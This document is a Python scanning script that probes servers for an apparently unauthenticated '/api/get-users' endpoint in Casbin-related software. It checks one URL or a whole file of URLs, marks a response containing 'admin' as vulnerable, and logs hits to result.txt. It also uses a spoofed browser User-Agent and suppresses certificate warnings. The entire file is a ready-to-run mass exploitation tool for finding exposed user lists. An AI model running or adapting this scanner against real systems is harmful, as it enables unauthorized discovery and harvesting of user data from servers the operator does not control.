import requests
import sys
import argparse
import urllib3

urllib3.disable_warnings()

def banner():
    banner = """      
(  ____ \(  ___  )(  ____ \(  ___ \ \__   __/( (    /|
| (    \/| (   ) || (    \/| (   ) )   ) (   |  \  ( |
| |      | (___) || (_____ | (__/ /    | |   |   \ | |
| |      |  ___  |(_____  )|  __ (     | |   | (\ \) |
| |      | (   ) |      ) || (  \ \    | |   | | \   |
| (____/\| )   ( |/\____) || )___) )___) (___| )  \  |
(_______/|/     \|\_______)|/ \___/ \_______/|/    )_)
                                                Version:1.0
                                                Author: Sec探索者
python3 Casbin_get_users.py -u http://127.0.0.1 #检测单个URL
python3 Casbin_get_users.py -f url.txt          #批量检测URL        
    """
    print(banner)
    parser = argparse.ArgumentParser(description="Casbin")
    parser.add_argument("-u", "--url", dest="url", type=str, help="input a url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="input a file")
    args = parser.parse_args()
    url = args.url
    file = args.file

    if url:
        url = f"{url}/api/get-users?p=123&pageSize=123"
        head1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"}
        try:
            res1 = requests.get(url=url, headers=head1, timeout=10)
            if res1.status_code == 200 and "admin" in res1.text:
                print(f"[+]{url} 存在漏洞")
            else:
                print(f"[-]{url} 不存在漏洞")
        except Exception:
            print(f"[-]{url} 请求失败,请检查网址")

    if file:
        with open(file, "r", encoding="utf-8") as f:
            for i in f.readlines():
                file_url = i.strip()
                if file_url != "":  # 判断file_url是否为空
                    url2 = file_url + "/api/get-users?p=123&pageSize=123"
                    head2 = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"}
                    try:
                        res2 = requests.get(url=url2, headers=head2, timeout=10)
                        if res2.status_code == 200 and "admin" in res2.text:
                            print(f"[+]{url2} 存在漏洞")
                            w = open("result.txt", "a")
                            w.write(url2 + '\r\n')
                        else:
                            print(f"[-]{url2} 不存在漏洞")
                    except Exception as e:
                        print("[-] 请求失败，请检查文件")

if __name__ == "__main__":
    banner()
